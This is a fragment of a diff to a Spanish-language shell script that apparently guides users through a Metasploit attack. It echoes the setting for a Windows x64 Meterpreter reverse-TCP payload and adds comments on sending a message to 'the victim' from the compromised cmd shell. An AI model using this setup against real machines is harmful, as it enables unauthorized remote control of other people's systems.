@@ -46,3 +46,7 @@ echo ""
 echo "Configure lo siguiente para x64"
 echo "set payload windows/x64/meterpreter/reverse_tcp"
 echo -e "\e[31m*****************************************************************\e[0m"
+
+#Una vez en cmd windows puedes enviar un mesaje a la victima - Ejemplo acontinuacion
+#C:\Windows\system32>msg * "Hola*
+#msg * "Hola*
